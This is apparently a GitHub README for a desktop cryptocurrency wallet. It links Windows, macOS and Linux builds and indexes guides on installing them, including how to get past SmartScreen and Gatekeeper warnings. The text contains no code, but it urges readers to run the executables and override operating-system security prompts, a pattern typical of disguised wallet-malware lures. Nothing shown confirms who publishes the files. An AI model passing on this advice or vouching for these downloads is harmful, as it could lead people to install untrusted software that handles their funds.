![SUI Wallet](assets/banner-hub.png)

# SUI Wallet install and troubleshooting

Fourteen guides for putting the desktop app on a machine, picking the right file, and fixing a build that will not run.

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-4DA2FF?style=for-the-badge&labelColor=0D1117)](#license) [![Latest release: v0.2.6](https://img.shields.io/badge/RELEASE-v0.2.6-1F6FEB?style=for-the-badge&labelColor=0D1117)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/tag/v0.2.6)

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## What this repository is for

This repository owns one boundary: the distance between a download and a wallet that opens. Every page here starts from the same assumption, that the reader already has the release page in front of them and something between the file and the app has gone wrong, or is about to.

Fourteen guides cover that ground. The first four are platform installs: Windows, macOS and Linux, plus the page that decides which of the three files a reader should take. The next five deal with the operating system's own gatekeeping, because Windows SmartScreen and macOS Gatekeeper both stop files that are perfectly correct, and both teach a reader to click past a warning they should read. The rest handle the awkward middle: an app that installs and never opens, one that opens and closes immediately, an update that leaves the old build running, and a machine that has to be handed back clean.

Nothing here describes keys, phrases or transfers. A reader who has a running wallet has left this repository and belongs in key-safety-and-login or onchain-transfer-guides, and each page says so once rather than repeating it.

The order matters, and the pages are written to be read in it. Pick the file first, because the wrong architecture downloads cleanly and fails at launch. Install second, because a build that refuses to open is usually a build that was never going to. Only then work the operating system's own prompt, which is a separate problem from a failed install and has its own two pages. Readers who start in the middle - reinstalling three times before checking the string in the requirements table - are the reason the first section of this page exists.

## Who it is for

- A download that finished and produced an application which does not start, with no error beyond a flicker or a warning dialog.
- Someone standing at the release page with three filenames and no way to tell which one their machine wants.
- A user on an older build who has been told, correctly, that the current release is the fix.
- Anyone removing the wallet from a computer that someone else will use afterwards.

## Start here

1. [SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) - One release ships three files; this is how to take the one built for your machine.
2. [How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) - Take the Windows .exe from the release page and open the app on a 64-bit Windows 10 or 11 machine.
3. [SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) - The install finished but nothing opened: the four causes and the fix for each.
4. [SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md) - Windows 10 (1909) or later 64-bit, macOS 12 or later, or x64 Linux with Ubuntu 20.04 or equivalent.

## How to use these guides

1. Read the requirements page once. Two of the three strings there exclude hardware that would otherwise download the file happily and fail at launch.
2. Take the file from the release page and match its SHA-256 against the digest printed beside it. A build from a video description or a mirror has nothing to compare against.
3. Install before you troubleshoot. The app that will not open is usually an old build on a new operating system, and the current release settles it.
4. If the app still fails, work the four causes in order: wrong architecture, blocked binary, damaged download, local state. The troubleshooting page puts them in that order because that is how often each one is the answer.
5. Return to this page when you update rather than reinstalling from memory. The update guide is one page and it removes a class of problem that a clean install would also fix, more slowly.

## The guides grouped

| Guide | What it answers |
| --- | --- |
| [How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) | Walk the Windows installer from download to the first wallet window, including the SmartScreen prompt and first launch. |
| [Installing SUI Wallet on macOS](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-install-on-macos.md) | Install the macOS disk image, clear the unidentified developer prompt, and confirm the app opens from Applications. |
| [Installing SUI Wallet on Linux](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/installing-sui-wallet-on-linux.md) | Unpack the Linux archive, choose the package format your distribution uses, and confirm the binary starts. |
| [SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) | Choose between the Windows, macOS and Linux files in the current release and check each against its published digest. |
| [Downloading SUI Wallet for Windows 10](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/download-sui-wallet-for-windows-10.md) | Confirm your Windows 10 build number, download the correct installer, and see why older 32-bit systems are out of scope. |
| [Which SUI Wallet file do I download?](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/which-sui-wallet-file-do-i-download.md) | Identify the file for your operating system from the release page without downloading all three and guessing. |
| [SUI Wallet system requirements](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-system-requirements.md) | Read the published platform requirements for each build and the architectures the current release does not cover. |
| [SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) | Diagnose an app that installs and then does nothing, from a blocked binary to a wrong-architecture download. |
| [installing SUI Wallet past SmartScreen](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/windows-protected-your-pc-sui-wallet.md) | Read the Windows SmartScreen prompt correctly and get past it when the file came from the official release page. |
| [macOS Gatekeeper and the dmg](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/macos-cannot-open-sui-wallet.md) | Clear the macOS unidentified-developer block, allow the app once, and confirm it launches afterwards. |
| [Updating SUI Wallet to the latest release](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/updating-sui-wallet-to-the-latest-release.md) | Move from an older build to the current release and check that the new version is the one actually running. |
| [How to uninstall SUI Wallet completely](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-uninstall-sui-wallet-completely.md) | Remove the application and its local data from Windows, macOS or Linux without leaving an account behind. |
| [Why SUI Wallet closes on startup](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/why-sui-wallet-closes-on-startup.md) | Work out why the wallet closes immediately after launch and which local files are safe to clear. |
| [Running SUI Wallet on another computer](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/running-sui-wallet-on-another-computer.md) | Bring an existing account to a second computer by restoring the recovery phrase rather than moving application files. |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Choose a file | [SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) | One download that matches the machine, taken from the release page and checked against its digest. |
| Install on Windows | [How to install SUI Wallet on Windows](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-install-sui-wallet-on-windows.md) | A wallet running on 64-bit Windows 10 or later, opened from the installer in the current release. |
| Get past SmartScreen | [installing SUI Wallet past SmartScreen](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/windows-protected-your-pc-sui-wallet.md) | The warning read for what it says, and the install completed on a file that came from the release page. |
| Fix an install that does nothing | [SUI Wallet won't open after install](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-wont-open-after-install.md) | The one cause behind a silent launch, identified by symptom rather than by trying four reinstalls. |
| Move to the current release | [Updating SUI Wallet to the latest release](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/updating-sui-wallet-to-the-latest-release.md) | The new build confirmed as the version running, with the old build's problems gone. |
| Hand a machine back | [How to uninstall SUI Wallet completely](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-uninstall-sui-wallet-completely.md) | No application and no local account data left behind for the next person to find. |

## Common first questions

### Is a .dmg safe to open if macOS says it cannot verify the developer?

Yes, when the file came from the release page and matches its digest; the prompt is about the developer signature, not about the file's contents. The macOS page walks the two settings that clear it.

### Do I need to uninstall before updating?

No. Install the current release over the old one and check the running version afterwards. A reinstall is slower and changes nothing a plain update does not.

### Why does the app close the moment it opens?

That is local state, not a lost account, and the phrase is unaffected. The startup page names the files that are safe to clear and the order to clear them in.

### Does the platform requirement change between releases?

The three strings in the table above are the ones this pack prints on every page, and they are the same three the release notes carry. Check the release page if a build is older than this page.

## Before you install

The requirements column above is the scope: 64-bit Windows 10 build 1909 or later, macOS 12 or later, or x64 Linux with Ubuntu 20.04 or an equivalent. An ARM Linux machine and a 32-bit Windows install both sit outside it.

Before installing anything, confirm the digest. The SHA-256 values are published on the release page and repeated in the application repository's README and release notes, which are the only two files in this account that carry them.

## About

This repository holds one of three guide sets published from the same account. The others are [install and repair](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting), [keys and login](https://github.com/sui-blockchain-wallet/key-safety-and-login) and [transfers and staking](https://github.com/sui-blockchain-wallet/onchain-transfer-guides), with [the profile repository](https://github.com/sui-blockchain-wallet) as the index.

The wallet is actively maintained. The release linked at the top of this page is the build these guides describe, and the release page is the only distribution channel this project uses.

## License

Apache License 2.0. A copy ships at the root of this repository, and the full text also sits in the application repository's [licence file](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/blob/HEAD/LICENSE).

---

SUI Wallet is a self-custody desktop wallet for Sui. Nothing on this page is investment advice, and no rate, return or unlock figure is a forecast.
